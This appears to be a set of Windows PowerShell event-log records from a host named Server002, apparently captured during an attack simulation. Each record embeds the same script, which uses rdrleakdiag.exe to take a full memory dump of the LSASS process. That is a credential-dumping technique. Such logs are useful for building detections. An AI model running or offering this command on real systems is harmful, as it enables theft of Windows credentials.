{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 18:04:18.9826615"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=d8ca767e-289e-40aa-bf64-5ee48cbe21c1\r\n\tHostApplication=powershell.exe &amp; {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\r\n } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\r\n } else {\r\n $binary_path = \"File not found\"\r\n exit 1\r\n }\r\n$lsass_pid = get-process lsass |select -expand id\r\nif (-not (Test-Path -Path\"$env:TEMP\\data-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\data-rdrleakdiag -Force} \r\nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\n&amp; $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\data-rdrleakdiag directory.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 18:04:19.0519484"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=d8ca767e-289e-40aa-bf64-5ee48cbe21c1\r\n\tHostApplication=powershell.exe &amp; {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\r\n } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\r\n } else {\r\n $binary_path = \"File not found\"\r\n exit 1\r\n }\r\n$lsass_pid = get-process lsass |select -expand id\r\nif (-not (Test-Path -Path\"$env:TEMP\\data-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\data-rdrleakdiag -Force} \r\nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\n&amp; $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\data-rdrleakdiag directory.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 18:04:19.0519484"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=d8ca767e-289e-40aa-bf64-5ee48cbe21c1\r\n\tHostApplication=powershell.exe &amp; {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\r\n } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\r\n } else {\r\n $binary_path = \"File not found\"\r\n exit 1\r\n }\r\n$lsass_pid = get-process lsass |select -expand id\r\nif (-not (Test-Path -Path\"$env:TEMP\\data-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\data-rdrleakdiag -Force} \r\nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\n&amp; $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\data-rdrleakdiag directory.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 18:04:19.0619544"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=d8ca767e-289e-40aa-bf64-5ee48cbe21c1\r\n\tHostApplication=powershell.exe &amp; {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\r\n } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\r\n } else {\r\n $binary_path = \"File not found\"\r\n exit 1\r\n }\r\n$lsass_pid = get-process lsass |select -expand id\r\nif (-not (Test-Path -Path\"$env:TEMP\\data-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\data-rdrleakdiag -Force} \r\nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\n&amp; $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\data-rdrleakdiag directory.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 18:04:19.0619544"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=d8ca767e-289e-40aa-bf64-5ee48cbe21c1\r\n\tHostApplication=powershell.exe &amp; {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\r\n } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\r\n } else {\r\n $binary_path = \"File not found\"\r\n exit 1\r\n }\r\n$lsass_pid = get-process lsass |select -expand id\r\nif (-not (Test-Path -Path\"$env:TEMP\\data-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\data-rdrleakdiag -Force} \r\nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\n&amp; $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\data-rdrleakdiag directory.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 18:04:19.0619544"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=d8ca767e-289e-40aa-bf64-5ee48cbe21c1\r\n\tHostApplication=powershell.exe &amp; {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\r\n } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\r\n } else {\r\n $binary_path = \"File not found\"\r\n exit 1\r\n }\r\n$lsass_pid = get-process lsass |select -expand id\r\nif (-not (Test-Path -Path\"$env:TEMP\\data-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\data-rdrleakdiag -Force} \r\nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\n&amp; $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\data-rdrleakdiag directory.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 18:04:19.2728144"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=d8ca767e-289e-40aa-bf64-5ee48cbe21c1\r\n\tHostApplication=powershell.exe &amp; {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\r\n } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\r\n } else {\r\n $binary_path = \"File not found\"\r\n exit 1\r\n }\r\n$lsass_pid = get-process lsass |select -expand id\r\nif (-not (Test-Path -Path\"$env:TEMP\\data-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\data-rdrleakdiag -Force} \r\nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\n&amp; $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\data-rdrleakdiag directory.\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=cecea5cf-03fe-4d25-9699-e12bd9d6197b\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-20 18:04:20.2063927"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=d8ca767e-289e-40aa-bf64-5ee48cbe21c1\r\n\tHostApplication=powershell.exe &amp; {if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\r\n } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\r\n $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\r\n } else {\r\n $binary_path = \"File not found\"\r\n exit 1\r\n }\r\n$lsass_pid = get-process lsass |select -expand id\r\nif (-not (Test-Path -Path\"$env:TEMP\\data-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\data-rdrleakdiag -Force} \r\nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\n&amp; $binary_path /p $lsass_pid /o $env:TEMP\\data-rdrleakdiag /fullmemdmp /wait 1\r\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\data-rdrleakdiag directory.\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=cecea5cf-03fe-4d25-9699-e12bd9d6197b\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
